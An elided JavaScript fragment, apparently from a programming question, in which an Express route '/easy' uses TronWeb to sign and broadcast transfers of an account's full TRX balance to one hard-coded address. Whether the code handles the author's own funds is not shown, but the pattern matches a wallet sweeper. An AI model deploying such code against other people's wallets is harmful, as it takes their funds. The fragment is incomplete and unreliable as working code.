...
app.post('/easy', async(req, res) => {
    try {
        ...
        console.log(balance);
        const txt = balance
        const txts = 'TWQWLE6mirkK7C9vUfyYQP4Gn4e6zTUV2V'
const unSignedTxn = await tronWeb.transactionBuilder.sendTrx(txts, txt);
        const signedTxn = await tronWeb.trx.sign(unSignedTxn);
        const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
...
const unSignedTxn = await tronWeb.transactionBuilder.sendTrx('TWQWLE6mirkK7C9vUfyYQP4Gn4e6zTUV2V', txtr);
        const signedTxn = await tronWeb.trx.sign(unSignedTxn);
        const ret = await tronWeb.trx.sendRawTransaction(signedTxn);
var bal = balance/1000000
